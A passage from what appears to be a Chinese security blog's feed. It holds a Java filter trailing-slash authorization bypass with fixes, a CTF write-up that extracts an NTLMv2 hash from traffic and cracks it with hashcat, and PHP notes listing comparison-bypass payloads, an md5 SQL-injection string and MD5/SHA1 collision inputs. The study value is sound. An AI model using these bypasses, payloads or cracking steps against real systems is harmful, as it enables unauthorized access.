class="hljs-keyword">value</span><br></code></pre></td></tr></table></figure><p>绕过分析：</p><p>考虑到上⾯使用request.getRequestURL()和request.getRequestURI()这两个⽅方法进行访问接⼝的获取时存在的安全隐患，这里使用 request.getServletPath()+(request.getPathInfo() &#x3D;&#x3D; null ? “” :</p><p>request.getPathInfo())进行路径的获取，但是如果在接口URI后追加额外的&#x2F;，还是可以获取到的：</p><p><img src="/2023/11/07/filter%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/1699337425304.png" alt="1699337425304"></p><p>根据上⾯的filter代码，正常情况下非登陆访问&#x2F;admin&#x2F;info.do，会提示未授权访问：</p><p><img src="/2023/11/07/filter%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/1699337456119.png" alt="1699337456119"></p><p>尝试在接口后追加额外的&#x2F;，成功绕过权限校验：</p><p><img src="/2023/11/07/filter%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/1699337502367.png" alt="1699337502367"></p><p>绕过方法：</p><p>尝试在对应的URL接口后加入&#x2F;，以绕过权限控制。</p><h2 id="1-4-修复建议及防御方式"><a href="#1-4-修复建议及防御方式" class="headerlink" title="1.4 修复建议及防御方式"></a>1.4 修复建议及防御方式</h2><p>以Java为例:</p><p>1.使用如下⽅法进⾏相关路路径的获取:</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-built_in">request</span>.getServletPath()+(<span class="hljs-built_in">request</span>.getPathInfo() == <span class="hljs-literal">null</span> ? <span class="hljs-string">&quot;&quot;</span> :<br><span class="hljs-built_in">request</span>.getPathInfo());<br></code></pre></td></tr></table></figure><p>2.对相关的接口访问进行标准化处理，剔除不相关的元素，例如..&#x2F;,分隔符(;)后的内容以及接⼝后不必要的&#x2F;等；</p><p>3.使用ESAPI的canonicalize方法进行规范化处理:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">ESAPI<span class="hljs-selector-class">.encoder</span>()<span class="hljs-selector-class">.canonicalize</span>(URI)<br></code></pre></td></tr></table></figure><p>同时在对应的配置⽂文件ESAPI.properties禁⽤用双重uri编码（默认开启）:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">Encoder.AllowMultipleEncoding=false<br></code></pre></td></tr></table></figure><p>具体效果如下，当接收到双重url编码时，会触发报错：</p><p><img src="/2023/11/07/filter%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/1699337596203.png" alt="1699337596203"></p><p>4.尽量不要使用类似startsWith()、endsWith()进⾏判断。</p><p>5.使用成熟的权限控制框架进行权限校验。（Spring Security、Shiro等）</p><h2 id="1-5-思维导图"><a href="#1-5-思维导图" class="headerlink" title="1.5 思维导图"></a>1.5 思维导图</h2><p><img src="/2023/11/07/filter%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E7%9A%84%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/1699337627831.png" alt="1699337627831"></p><p>Springboot未授权访问</p><p><a href="https://link.zhihu.com/?target=https://www.hetianlab.com/expc.do?ec=ECID07d9-3ccd-4c90-8a09-b980d8cd7858">https://www.hetianlab.com/expc.do?</a></p><p>（Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息从而导致信息泄露的事件发生。）</p><p><strong>转载自：<a href="https://zhuanlan.zhihu.com/p/593376086">https://zhuanlan.zhihu.com/p/593376086</a></strong>,做个笔记</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Geek Challenge 2023</title>
    <link href="/2023/11/02/GeekChallenge/"/>
    <url>/2023/11/02/GeekChallenge/</url>
    
    <content type="html"><![CDATA[<h2 id="DEATH-N1TE"><a href="#DEATH-N1TE" class="headerlink" title="DEATH_N1TE"></a>DEATH_N1TE</h2><p><img src="/2023/11/02/GeekChallenge/1700036846554.png" alt="1700036846554"></p><p><img src="/2023/11/02/GeekChallenge/1700036868679.png" alt="1700036868679"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF-wp-Web&amp;Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NTLMSSP流量解密</title>
    <link href="/2023/10/31/NTLMSSP%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86/"/>
    <url>/2023/10/31/NTLMSSP%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86/</url>
    
    <content type="html"><![CDATA[<p>NTLMSSP流量解密</p><p>记三叶草的一道misc</p><p>给了一个流量包</p><p>导出http对象得到提示，密码在rockyou.txt中，而且是弱密码</p><p>发现了可以的请求头，去网上搜了一下NTLMSSP流量解密，找到一篇文章</p><p><a href="https://zhuanlan.zhihu.com/p/52882041">9步从pcap文件中提取并破解 NTLMv2 哈希</a></p><p>通过<code>ntlmssp</code>这一字符串进行数据包筛选，获得身份验证的握手包</p><p>将域名和用户名复制到文本文档中。</p><p>深入查找<code>NTLM</code>响应部分，找到<code>NTProofStr</code>字段和<code>NTLMv2</code>的响应。将它们作为十六进制字符串复制到文本文档中。</p><p>注意<code>NTLMv2Response</code>是从<code>ntlmProofStr</code>开始，因此从<code>NTLMv2</code>的响应中删除<code>ntlmProofStr</code>。</p><p>在Wireshark的搜索过滤器中输入<code>ntlmssp.ntlmserverchallenge</code>。就会发现<code>NTLM Server Challenge</code>字段，通常这个数据包是在<code>NTLM_Auth</code>数据包之前。将该值作为十六进制字符串复制到文本文档。</p><p>将以上的所有值按以下格式保存到crackme.txt：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">username::<span class="hljs-symbol">domain:</span><span class="hljs-title class_">ServerChallenge</span><span class="hljs-symbol">:NTproofstr</span><span class="hljs-symbol">:NTLMV2</span> response(删去和<span class="hljs-title class_">NTproofstr</span>相同部分)<br></code></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">jack:</span>:WIDGETLLC:<span class="hljs-number">2</span>af<span class="hljs-number">71</span>b<span class="hljs-number">5</span>ca<span class="hljs-number">7246268</span>:<span class="hljs-number">2</span>d<span class="hljs-number">1</span>d<span class="hljs-number">24572</span>b<span class="hljs-number">15</span>fe<span class="hljs-number">544043431</span><span class="hljs-keyword">c</span><span class="hljs-number">59965</span>d<span class="hljs-number">30</span>:<span class="hljs-number">0101000000000000040</span>d<span class="hljs-number">962</span>b<span class="hljs-number">02</span>edd<span class="hljs-number">901e6994147</span>d<span class="hljs-number">6</span>a<span class="hljs-number">34</span>af<span class="hljs-number">200000000020012005700490044004700450054004</span><span class="hljs-keyword">c</span><span class="hljs-number">004</span><span class="hljs-keyword">c</span><span class="hljs-number">004300010008004400430030003100040024005700690064006700650074004</span><span class="hljs-keyword">c</span><span class="hljs-number">004</span><span class="hljs-keyword">c</span><span class="hljs-number">0043002e0049006</span>e<span class="hljs-number">007400650072006e0061006</span><span class="hljs-keyword">c</span><span class="hljs-number">0003002e0044004300300031002</span>e<span class="hljs-number">005700690064006700650074004</span><span class="hljs-keyword">c</span><span class="hljs-number">004</span><span class="hljs-keyword">c</span><span class="hljs-number">0043002e0049006</span>e<span class="hljs-number">007400650072006e0061006</span><span class="hljs-keyword">c</span><span class="hljs-number">00050024005700690064006700650074004</span><span class="hljs-keyword">c</span><span class="hljs-number">004</span><span class="hljs-keyword">c</span><span class="hljs-number">0043002e0049006</span>e<span class="hljs-number">007400650072006e0061006</span><span class="hljs-keyword">c</span><span class="hljs-number">0007000800040</span>d<span class="hljs-number">962</span>b<span class="hljs-number">02</span>edd<span class="hljs-number">90106000400020000000800300030000000000000000000000000300000078</span>cdc<span class="hljs-number">520910762267e40488</span>b<span class="hljs-number">60032835</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>a<span class="hljs-number">37604</span>d<span class="hljs-number">1e9</span>be<span class="hljs-number">3</span>ecee<span class="hljs-number">58802</span>fb<span class="hljs-number">5</span>f<span class="hljs-number">9150</span>a<span class="hljs-number">001000000000000000000000000000000000000900200048005400540050002</span>f<span class="hljs-number">003100390032002e003100360038002</span>e<span class="hljs-number">0030002e0031000000000000000000</span><br></code></pre></td></tr></table></figure><p>运行命令</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">hashcat</span> -m <span class="hljs-number">5600</span> <span class="hljs-string">&#x27;/home/kali/Desktop/crackme.txt&#x27;</span> rockyou.txt<br></code></pre></td></tr></table></figure><p><img src="/2023/10/31/NTLMSSP%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86/image-20231031232448299.png" alt="image-20231031232448299"></p><p>flag:SYC{iamjackspassword}</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF_Misc流量</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP tricks</title>
    <link href="/2023/10/28/PHP_tricks/"/>
    <url>/2023/10/28/PHP_tricks/</url>
    
    <content type="html"><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h3 id="数组绕过强比较"><a href="#数组绕过强比较" class="headerlink" title="数组绕过强比较"></a>数组绕过强比较</h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">md5($_POST[<span class="hljs-string">&#x27;key3&#x27;</span>]) === sha1($_POST[<span class="hljs-string">&#x27;key3&#x27;</span>])<br></code></pre></td></tr></table></figure><p>payload:<code>key3[]=1</code></p><h3 id="0e绕过弱比较"><a href="#0e绕过弱比较" class="headerlink" title="0e绕过弱比较"></a>0e绕过弱比较</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">sha1($<span class="hljs-built_in">array</span>1) === sha1($<span class="hljs-built_in">array</span>2)<br></code></pre></td></tr></table></figure><p>payload: <code>qw[]=10932435112&amp;yxx[]=aaroZmOk</code></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs llvm">md<span class="hljs-number">5</span><br><span class="hljs-number">240610708</span>:<span class="hljs-number">0e462097431906509019562988736854</span><br>QLTHNDT:<span class="hljs-number">0e405967825401955372549139051580</span><br>QNKCDZO:<span class="hljs-number">0e830400451993494058024219903391</span><br>PJNPDWY:<span class="hljs-number">0e291529052894702774557631701704</span><br>NWWKITQ:<span class="hljs-number">0e763082070976038347657360817689</span><br>NOOPCJF:<span class="hljs-number">0e818888003657176127862245791911</span><br>MMHUWUV:<span class="hljs-number">0e701732711630150438129209816536</span><br>MAUXXQC:<span class="hljs-number">0e478478466848439040434801845361</span><br><br>sha<span class="hljs-number">1</span><br><span class="hljs-number">10932435112</span>: <span class="hljs-number">0e07766915004133176347055865026311692244</span><br>aaroZmOk: <span class="hljs-number">0e66507019969427134894567494305185566735</span><br>aaK<span class="hljs-number">1</span>STfY: <span class="hljs-number">0e76658526655756207688271159624026011393</span><br>aaO<span class="hljs-number">8</span>zKZF: <span class="hljs-number">0e89257456677279068558073954252716165668</span><br>aa<span class="hljs-number">3</span>OFF<span class="hljs-number">9</span>m: <span class="hljs-number">0e36977786278517984959260394024281014729</span><br><span class="hljs-number">0e1290633704</span>: <span class="hljs-number">0e19985187802402577070739524195726831799</span><br><br>双重md<span class="hljs-number">5</span><br><span class="hljs-number">7</span>r<span class="hljs-number">4</span>lGXCH<span class="hljs-number">2</span>Ksu<span class="hljs-number">2</span>JNT<span class="hljs-number">3</span>BYM<br>CbDLytmyGm<span class="hljs-number">2</span>xQyaLNhWn<br><span class="hljs-number">770</span>hQgrBOjrcqftrlaZk<br><br>$a<span class="hljs-operator">=</span><span class="hljs-operator">=</span>md<span class="hljs-number">5</span>($a)<br><span class="hljs-number">0e215962017</span><br><br>md<span class="hljs-number">5</span>绕过SQL<br>ffifdyop，经过md<span class="hljs-number">5</span>函数后结果为 &#x27;<span class="hljs-keyword">or</span>&#x27;<span class="hljs-number">6</span>\xc<span class="hljs-number">9</span>]\<span class="hljs-keyword">x</span><span class="hljs-number">99</span>\xe<span class="hljs-number">9</span><span class="hljs-title">!r</span><span class="hljs-punctuation">,</span>\xf<span class="hljs-number">9</span>\xedb\<span class="hljs-keyword">x</span><span class="hljs-number">1</span><span class="hljs-keyword">c</span>；<br><span class="hljs-number">129581926211651571912466741651878684928</span>，经过md<span class="hljs-number">5</span>函数后结果为 \<span class="hljs-keyword">x</span><span class="hljs-number">06</span>\xdaT<span class="hljs-number">0</span>D\<span class="hljs-keyword">x</span><span class="hljs-number">9</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">8</span>fo#\xdf\xc<span class="hljs-number">1</span>&#x27;<span class="hljs-keyword">or</span>&#x27;<span class="hljs-number">8</span>；<br><br>NAN和INF，分别为非数字和无穷大，但是var_dump一下它们的数据类型却是<span class="hljs-keyword">double</span>，那么在md<span class="hljs-number">5</span>函数处理它们的时候，<br>是将其直接转换为字符串”NAN”和字符串”INF”使用的，但是它们拥有特殊的性质，它们与任何数据类型（除了<span class="hljs-keyword">true</span>）<br>做强类型或弱类型比较均为<span class="hljs-keyword">false</span>，甚至NAN<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>NAN都是<span class="hljs-keyword">false</span>，但md<span class="hljs-number">5</span>(&#x27;NaN&#x27;)<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>md<span class="hljs-number">5</span>(&#x27;NaN&#x27;)为<span class="hljs-keyword">true</span>。<br><br>md<span class="hljs-number">5</span>碰撞，sha<span class="hljs-number">1</span>碰撞<br>使用碰撞可以绕过不同字符串，相同md<span class="hljs-number">5</span>/sha<span class="hljs-number">1</span>的强比较<br>MD<span class="hljs-number">5</span>碰撞：<br><span class="hljs-symbol">url:</span><br>两组经过url编码后的值，<br><span class="hljs-variable">#1</span><br>a<span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1U</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span>   <br>b<span class="hljs-operator">=</span>M<span class="hljs-variable">%C9h</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%0</span>E<span class="hljs-variable">%E3</span><span class="hljs-variable">%5</span>C<span class="hljs-variable">%20</span><span class="hljs-variable">%95</span>r<span class="hljs-variable">%D4w</span><span class="hljs-variable">%7</span>Br<span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%D3o</span><span class="hljs-variable">%A7</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%1</span>B<span class="hljs-variable">%DCV</span><span class="hljs-variable">%B7J</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C0x</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%7</span>B<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%28</span>K<span class="hljs-variable">%F3n</span><span class="hljs-variable">%8</span>EKU<span class="hljs-variable">%B3_Bu</span><span class="hljs-variable">%93</span><span class="hljs-variable">%D8Igm</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%D1</span><span class="hljs-variable">%D5</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%FB_</span><span class="hljs-variable">%07</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%A2</span>   <br><span class="hljs-variable">#2</span><br>a<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span>   <br>b<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span>%<br><span class="hljs-variable">#3</span><br>$a<span class="hljs-operator">=</span><span class="hljs-string">&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;</span><span class="hljs-comment">;</span><br>$b<span class="hljs-operator">=</span><span class="hljs-string">&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;</span><span class="hljs-comment">;</span><br><span class="hljs-comment"></span><br>文件：<br>linux使用md<span class="hljs-number">5</span>collgen碰撞生成两个md<span class="hljs-number">5</span>值相同但内容不同的文件<br>md<span class="hljs-number">5</span>collgen -o <span class="hljs-number">1</span>.bin <span class="hljs-number">2</span>.bin<br>windows可以下载fastcoll，碰撞生成两个md<span class="hljs-number">5</span>值相同但内容不同的文件<br>fastcoll.exe -p <span class="hljs-number">123</span>.txt -o <span class="hljs-number">1</span>.txt <span class="hljs-number">2</span>.txt<br><br>sha<span class="hljs-number">1</span>碰撞：<br>url：<br>a<span class="hljs-operator">=</span><span class="hljs-variable">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%25</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%D3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>A<span class="hljs-number">1</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>obj<span class="hljs-variable">%0</span>A<span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>C/Width<span class="hljs-variable">%202</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Height<span class="hljs-variable">%203</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Type<span class="hljs-variable">%204</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Subtype<span class="hljs-variable">%205</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Filter<span class="hljs-variable">%206</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/ColorSpace<span class="hljs-variable">%207</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/Length<span class="hljs-variable">%208</span><span class="hljs-variable">%200</span><span class="hljs-variable">%20</span>R/BitsPerComponent<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>E<span class="hljs-variable">%0</span>Astream<span class="hljs-variable">%0</span>A<span class="hljs-variable">%FF</span><span class="hljs-variable">%D8</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%00</span><span class="hljs-variable">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>dead<span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%21</span><span class="hljs-variable">%85</span>/<span class="hljs-variable">%EC</span><span class="hljs-variable">%09</span><span class="hljs-variable">%239</span>u<span class="hljs-variable">%9</span>C<span class="hljs-number">9</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%A1</span><span class="hljs-variable">%C6</span><span class="hljs-variable">%3</span>CL<span class="hljs-variable">%97</span><span class="hljs-variable">%E1</span><span class="hljs-variable">%FF</span><span class="hljs-variable">%FE</span><span class="hljs-variable">%01</span><span class="hljs-variable">%7</span>FF<span class="hljs-variable">%DC</span><span class="hljs-variable">%93</span><span class="hljs-variable">%A6</span><span class="hljs-variable">%B6</span><span class="hljs-variable">%7</span>E<span class="hljs-variable">%01</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%02</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%AA</span><span class="hljs-variable">%1</span>D<span class="hljs-variable">%B2V</span><span class="hljs-variable">%0</span>BE<span class="hljs-variable">%CAg</span><span class="hljs-variable">%D6</span><span class="hljs-variable">%88</span><span class="hljs-variable">%C7</span><span class="hljs-variable">%F8K</span><span class="hljs-variable">%8</span>CLy<span class="hljs-variable">%1</span>F<span class="hljs-variable">%E0</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%3</span>D<span class="hljs-variable">%F6</span><span class="hljs-variable">%14</span><span class="hljs-variable">%F8m</span><span class="hljs-variable">%B1i</span><span class="hljs-variable">%09</span><span class="hljs-variable">%01</span><span class="hljs-variable">%C5kE</span><span class="hljs-variable">%C1S</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%FE</span><span class="hljs-variable">%DF</span><span class="hljs-variable">%B7</span><span class="hljs-variable">%608</span><span class="hljs-variable">%E9rr</span>/<span class="hljs-variable">%E7</span><span class="hljs-variable">%ADr</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%0</span>EI<span class="hljs-variable">%04</span><span class="hljs-variable">%E0F</span><span class="hljs-variable">%C20W</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%E9</span><span class="hljs-variable">%D4</span><span class="hljs-variable">%13</span><span class="hljs-variable">%98</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%E1.</span><span class="hljs-variable">%F5</span><span class="hljs-variable">%BC</span><span class="hljs-variable">%94</span><span class="hljs-variable">%2</span>B<span class="hljs-variable">%E35B</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%80</span>-<span class="hljs-variable">%98</span><span class="hljs-variable">%B5</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%2</span>A<span class="hljs-number">3</span>.<span class="hljs-variable">%C3</span><span class="hljs-variable">%7</span>F<span class="hljs-variable">%AC5</span><span class="hljs-variable">%14</span><span class="hljs-variable">%E7M</span><span class="hljs-variable">%DC</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%2</span>C<span class="hljs-variable">%C1</span><span class="hljs-variable">%A8t</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%0</span>Cx<span class="hljs-number">0</span>Z<span class="hljs-variable">%21</span>Vda<span class="hljs-number">0</span><span class="hljs-variable">%97</span><span class="hljs-variable">%89</span><span class="hljs-variable">%60</span>k<span class="hljs-variable">%D0</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%98</span><span class="hljs-variable">%CD</span><span class="hljs-variable">%A8</span><span class="hljs-variable">%04</span>F<span class="hljs-variable">%29</span><span class="hljs-variable">%A1</span><br>b<span class="hljs-operator">=</span><span class="hljs-variable">%25</span>PDF<span class="hljs-number">-1.3</span><span class="hljs-variable">%0</span>A<span class="hljs-variable">%25</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%E3</span><span class="hljs-variable">%CF</span><span class="hljs-variable">%D3</span><span 